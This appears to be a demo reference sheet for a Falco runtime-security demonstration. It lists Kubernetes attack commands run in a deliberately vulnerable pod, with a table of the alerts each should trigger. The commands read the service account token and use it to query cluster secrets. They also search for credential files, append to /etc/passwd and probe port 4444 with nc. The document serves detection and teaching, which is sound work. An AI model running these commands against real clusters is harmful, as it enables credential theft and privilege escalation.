# Attack Commands Reference

Quick reference for individual attack commands during live demos.
Run these via `kubectl exec` into the vulnerable pod.

## Setup

```bash
# Get pod name
export POD=$(kubectl get pod -n vulnerable-app -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')

# Start watching Falco logs in another terminal
kubectl logs -n falco -l app.kubernetes.io/name=falco -f --since=1m
```

## Reconnaissance Commands

```bash
# Discover environment (Kubernetes API server address)
kubectl exec -n vulnerable-app $POD -- env | grep KUBE

# Read service account token
kubectl exec -n vulnerable-app $POD -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Check DNS configuration
kubectl exec -n vulnerable-app $POD -- cat /etc/resolv.conf

# List mounted filesystems
kubectl exec -n vulnerable-app $POD -- mount
```

## Credential Theft Commands

```bash
# Query Kubernetes API for secrets using stolen token
kubectl exec -n vulnerable-app $POD -- sh -c '
  curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/secrets?limit=5
'

# Try to access secrets in kube-system
kubectl exec -n vulnerable-app $POD -- sh -c '
  curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/namespaces/kube-system/secrets
'

# Search for credential files
kubectl exec -n vulnerable-app $POD -- find / -name "*.pgpass" -o -name ".my.cnf" 2>/dev/null
```

## Privilege Escalation Commands

```bash
# Attempt to write to sensitive files
kubectl exec -n vulnerable-app $POD -- sh -c 'echo "test" >> /etc/passwd'

# Check what user we're running as
kubectl exec -n vulnerable-app $POD -- id

# Check capabilities
kubectl exec -n vulnerable-app $POD -- sh -c 'cat /proc/1/status | grep Cap'
```

## Lateral Movement Commands

```bash
# Discover other services
kubectl exec -n vulnerable-app $POD -- sh -c '
  curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
    https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1/services
'

# Connect to non-standard port (triggers Falco)
kubectl exec -n vulnerable-app $POD -- sh -c 'timeout 2 nc -z 10.0.0.1 4444 2>/dev/null; true'
```

## Expected Falco Alerts

| Action | Expected Alert | Priority |
|--------|---------------|----------|
| Read SA token | Read Service Account Token | WARNING |
| Query secrets API | Container Accessing K8s Secrets | CRITICAL |
| Shell access | Terminal Shell in Container | NOTICE |
| Write /etc/passwd | Container Privilege Escalation | CRITICAL |
| Non-standard port | Outbound Connection to Non-Standard Port | WARNING |
| Exec into pod | Kubectl Exec Detected | WARNING |
